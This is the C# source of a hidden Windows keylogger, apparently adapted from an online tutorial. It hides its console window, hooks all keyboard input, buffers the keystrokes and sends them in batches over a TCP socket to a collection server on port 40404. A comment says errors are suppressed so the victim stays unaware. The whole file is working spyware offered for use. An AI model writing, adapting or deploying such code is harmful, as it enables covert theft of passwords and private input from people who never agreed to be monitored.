/*
Adapted from URL=[http://www.businessinsider.com/how-to-create-a-simple-hidden-console-keylogger-in-c-sharp-2012-1]
Used socket code from URL=[https://docs.microsoft.com/en-us/dotnet/framework/network-programming/synchronous-client-socket-example]
*/

using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Text;

public static class Globals
{
    public const string serverIP = "10.0.2.15";
    public const Int32 keyPort = 40404;
    public const Int32 screenPort = 40405;
}

public class WinLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc proc = KeyLogging;
    private static IntPtr hookInt = IntPtr.Zero;

    private const int maxBufferSize = 256;
    private static Keys[] userBuffer = new Keys[maxBufferSize];
    private static int bufIndex = 0;
    
    static public void Main ()
    {
        var wind = GetConsoleWindow();
        ShowWindow(wind, SW_HIDE);
        hookInt = SetWindowsHookEx(WH_KEYBOARD_LL, proc, (IntPtr)null, 0);
        Application.Run();
        UnhookWindowsHookEx(hookInt);
    }
    
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static IntPtr KeyLogging(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            userBuffer[bufIndex++] = (Keys)vkCode;
            
            if(bufIndex >= maxBufferSize)
            {
                flushBufferToServer(ref userBuffer, bufIndex);
                bufIndex = 0;
            }
        }
        return CallNextHookEx(hookInt, nCode, wParam, lParam);
    }

    private static void flushBufferToServer(ref Keys[] buf, int end_idx) {
        string concatBuf = "";
        for(int i = 0; i < end_idx; i++)
        {
            concatBuf += buf[i].ToString();
        }

        try {
            // Establish the remote endpoint for the socket.  
            IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());  
            //IPAddress ipAddress = IPAddress.Parse(Globals.serverIP);
            IPAddress ipAddress = ipHostInfo.AddressList[0];
            IPEndPoint remoteEP = new IPEndPoint(ipAddress, Globals.keyPort);  

            // Create a TCP/IP  socket.  
            Socket server = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);  

            // Connect the socket to the remote endpoint. Catch any errors.  
            try {  
                server.Connect(remoteEP);

                // Encode the data string into a byte array.
                byte[] msg = Encoding.ASCII.GetBytes(concatBuf+"<EOF>"); 

                // Send the data through the socket.  
                int bytesSent = server.Send(msg);

                // Release the socket.  
                server.Shutdown(SocketShutdown.Both);  
                server.Close();
            } catch (Exception e) {
                /* If something goes wrong, oh well. At least user is still in the dark.
                    Uncomment below line for debugging exceptions. */
                //File.AppendAllText(@"C:\Users\IEUser\Downloads\exceptions.txt", e.ToString());
            }
        } catch (Exception) {}
    }
    
    //These Dll's will handle the hooks.
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, 
    LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
    IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    // The two dll imports below will handle the window hiding.
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    const int SW_HIDE = 0;
}